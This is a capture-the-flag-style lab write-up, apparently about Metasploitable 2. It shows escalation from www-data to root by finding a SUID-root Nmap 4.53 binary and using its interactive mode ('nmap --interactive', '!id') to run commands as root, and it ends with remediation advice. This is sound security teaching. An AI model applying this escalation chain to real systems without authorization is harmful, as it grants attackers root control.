# MS2 — Privilege Escalation

## Initial Context

After WebDAV exploitation, the session was running as:

```text
www-data
```

Working directory:

```text
/var/www/dav
```

## SUID Enumeration

Command:

```bash
find / -perm -4000 -type f 2>/dev/null | sort
```

Important result:

```text
/usr/bin/nmap
```

Permissions:

```text
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
```

The `s` in the owner execute position indicates SUID.

## Nmap Version

```bash
nmap --version
```

Result:

```text
Nmap version 4.53
```

## Interactive Mode

```bash
nmap --interactive
```

Result:

```text
Welcome to Interactive Mode
nmap>
```

The legacy interactive mode allowed commands to be executed through the privileged Nmap process.

Identity validation from the Nmap prompt:

```text
!id
!whoami
```

This confirmed root execution.

## Privilege Escalation Chain

```text
www-data
   |
   v
SUID enumeration
   |
   v
/usr/bin/nmap
   |
   v
root-owned SUID binary
   |
   v
Nmap 4.53 interactive mode
   |
   v
root command execution
```

## Root Cause

A legacy Nmap binary was incorrectly installed with SUID-root permissions. Its interactive functionality allowed the privilege boundary to be crossed.

## Defensive Remediation

- Remove unnecessary SUID permission from Nmap.
- Remove or upgrade legacy Nmap.
- Prevent interactive/admin-capable utilities from being unnecessarily SUID.
- Regularly audit SUID/SGID binaries.
- Restrict WebDAV and disable anonymous write access.
- Prevent server-side script execution in upload directories.
- Upgrade unsupported Apache/PHP components.
- Segment vulnerable lab systems from trusted networks.

## Key Lesson

Local privilege escalation should follow evidence:

`Initial access → identity → local enumeration → SUID discovery → identify dangerous capability → validate privilege boundary`.
